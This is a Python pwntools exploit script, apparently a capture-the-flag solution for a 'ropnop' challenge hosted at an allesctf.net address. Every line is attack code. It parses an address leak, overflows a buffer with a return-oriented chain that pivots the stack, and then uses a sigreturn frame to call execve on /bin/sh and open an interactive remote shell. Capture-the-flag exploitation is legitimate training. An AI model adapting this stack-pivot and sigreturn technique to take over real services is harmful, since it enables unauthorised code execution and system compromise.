#!/usr/bin/env python3

from pwn import *
from sys import argv
import re

MAIN_TARGET_OFFSET = 0x5555555552bb - 0x555555554000
DATA_OFFSET = 0x4000
SYSCALL_OFFSET = 0x11e4
ROPNOP_RAX_OFFSET = 0x125b

SYS_SIGRETURN = 15
SYS_EXECVE = 59

if "-" in argv[1:]:
    p = process("./ropnop")
    pause()
else:
    p = remote("hax1.allesctf.net", 9300)

leak = p.recvline()
bin_addr = int(re.findall(b"start: 0x(.*?) ", leak)[0], 16)

payload = b"A" * 16
payload += p64(bin_addr + DATA_OFFSET + 0x20)   # rbp
payload += p64(bin_addr + MAIN_TARGET_OFFSET)   # ret addr 1 (back to read in main)
payload += b"A" * 0x20
payload += p64(bin_addr + DATA_OFFSET + 0x28)   # rbp
payload += p64(bin_addr + ROPNOP_RAX_OFFSET)    # ret addr 2 (set rax in ropnop)
payload += b"A" * 0x28
payload += p64(bin_addr + SYSCALL_OFFSET)       # ret addr 3 (syscall sys_sigreturn)

context.arch = "amd64"
frame = SigreturnFrame()
frame.rip = bin_addr + SYSCALL_OFFSET
frame.rsp = bin_addr + DATA_OFFSET + 0x100
frame.rax = SYS_EXECVE
frame.rdi = bin_addr + DATA_OFFSET + 0x20
frame.rsi = 0
frame.rdx = 0

payload += bytes(frame)

p.send(payload)
sleep(1)

p.send(p64(SYS_SIGRETURN) * 2 + b"/bin/sh\0")
p.interactive()
